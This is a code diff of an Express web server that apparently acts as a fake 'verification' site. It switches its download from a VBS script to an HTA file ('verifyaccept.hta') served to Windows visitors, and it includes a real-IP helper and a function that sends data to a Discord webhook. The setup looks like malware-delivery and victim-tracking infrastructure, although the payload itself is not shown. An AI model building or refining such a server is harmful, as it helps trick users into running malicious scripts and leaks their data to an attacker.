@@ -1,18 +1,18 @@
-
 require('dotenv').config();
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const bodyParser = require('body-parser');
 const https = require('https');
+const cookieParser = require('cookie-parser'); // Add cookie parser middleware
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(bodyParser.json());
+app.use(cookieParser());  // <-- Add this to enable reading cookies
 app.use(express.static('public'));
 app.set('view engine', 'html');
 app.engine('html', require('ejs').renderFile);
-
 
 // Middleware to get real IP address
 function getRealIP(req) {
@@ -65,10 +65,17 @@ app.get('/verify', (req, res) => {
 // Static routes
 app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
 app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));
-app.get('/verifyaccept.vbs', (req, res) => {
-  res.set('Content-Type', 'application/x-vbs');
-  res.sendFile(path.join(__dirname, 'public/verifyaccept.vbs'));
+
+// Serve the HTA file correctly here:
+app.get('/verifyaccept.hta', (req, res) => {
+  res.set('Content-Type', 'application/hta');
+  res.sendFile(path.join(__dirname, 'public/verifyaccept.hta'));
 });
+
+app.listen(PORT, () => {
+  console.log(`Server running on http://localhost:${PORT}`);
+});
+
 
 
 // Function to send data to Discord webhook
